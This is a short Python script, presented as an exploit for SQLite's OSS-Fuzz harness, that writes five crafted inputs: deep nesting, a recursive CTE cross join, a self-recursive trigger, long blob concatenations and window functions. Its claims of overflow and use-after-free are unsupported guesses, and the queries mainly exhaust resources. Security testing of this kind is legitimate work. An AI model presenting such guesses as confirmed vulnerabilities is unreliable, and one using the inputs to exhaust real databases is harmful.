#!/usr/bin/env python3
"""
SQLite OSS-Fuzz Harness Vulnerability Exploit

The harness parses input as follows:
1. If data[1] == '\n', then uSelector = data[0] and SQL starts at data[2]
2. Otherwise, uSelector = 0xfd and SQL starts at data[0]

The uSelector determines:
- Bit 0: foreign key constraints enabled/disabled
- Remaining bits: execCnt limit (number of output rows + 1)

Vulnerability targets:
1. Integer overflow in execCnt calculation when uSelector is large
2. Memory exhaustion through complex SQL queries within limits
3. Stack overflow through deeply nested SQL expressions
4. Use-after-free through complex transaction scenarios

Strategy: Craft SQL that maximizes resource usage while staying within the 10-second
timeout and 20MB memory limit, focusing on operations that might cause sanitizer
violations in SQLite's internal operations.
"""

import struct

def create_payload_1():
    """Deep recursion SQL to trigger stack overflow"""
    # Use selector 0xff to get maximum execCnt
    selector = b'\xff\n'
    
    # Create deeply nested SELECT statements to exhaust stack
    depth = 500
    sql = "SELECT " + "(" * depth + "1" + ")" * depth
    
    return selector + sql.encode('utf-8')

def create_payload_2():
    """Complex CTE to trigger memory issues"""
    selector = b'\xfe\n'
    
    # Recursive CTE that grows exponentially
    sql = """
    WITH RECURSIVE r(i) AS (
        SELECT 1
        UNION ALL
        SELECT i+1 FROM r WHERE i < 1000
    )
    SELECT COUNT(*) FROM r, r AS r2, r AS r3;
    """
    
    return selector + sql.encode('utf-8')

def create_payload_3():
    """Trigger use-after-free with complex transactions"""
    selector = b'\xfd\n'
    
    sql = """
    CREATE TABLE t1(x);
    BEGIN;
    INSERT INTO t1 VALUES(randomblob(49999));
    CREATE TRIGGER tr1 AFTER INSERT ON t1 BEGIN
        INSERT INTO t1 VALUES(randomblob(49999));
    END;
    INSERT INTO t1 VALUES(1);
    ROLLBACK;
    DROP TABLE t1;
    """
    
    return selector + sql.encode('utf-8')

def create_payload_4():
    """Integer overflow in string operations"""
    selector = b'\xff\n'
    
    # Create very long strings that approach the 50000 limit
    sql = """
    SELECT 
        substr(randomblob(49999), 1, 49999) || 
        substr(randomblob(49999), 1, 49999) ||
        substr(randomblob(49999), 1, 49999);
    """
    
    return selector + sql.encode('utf-8')

def create_payload_5():
    """Complex window functions with potential buffer issues"""
    selector = b'\xfe\n'
    
    sql = """
    CREATE TABLE t(x);
    INSERT INTO t VALUES (1);
    INSERT INTO t SELECT * FROM t;
    INSERT INTO t SELECT * FROM t;
    INSERT INTO t SELECT * FROM t;
    INSERT INTO t SELECT * FROM t;
    INSERT INTO t SELECT * FROM t;
    SELECT 
        row_number() OVER (ORDER BY x),
        lag(x, 1000) OVER (ORDER BY x),
        lead(x, 1000) OVER (ORDER BY x),
        first_value(x) OVER (ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING)
    FROM t;
    """
    
    return selector + sql.encode('utf-8')

# Generate all payloads
payloads = [
    create_payload_1(),
    create_payload_2(), 
    create_payload_3(),
    create_payload_4(),
    create_payload_5()
]

# Write binary files
for i, payload in enumerate(payloads, 1):
    filename = f"x{i}.bin" if i > 1 else "x.bin"
    with open(filename, 'wb') as f:
        f.write(payload)
    print(f"Generated {filename} ({len(payload)} bytes)")
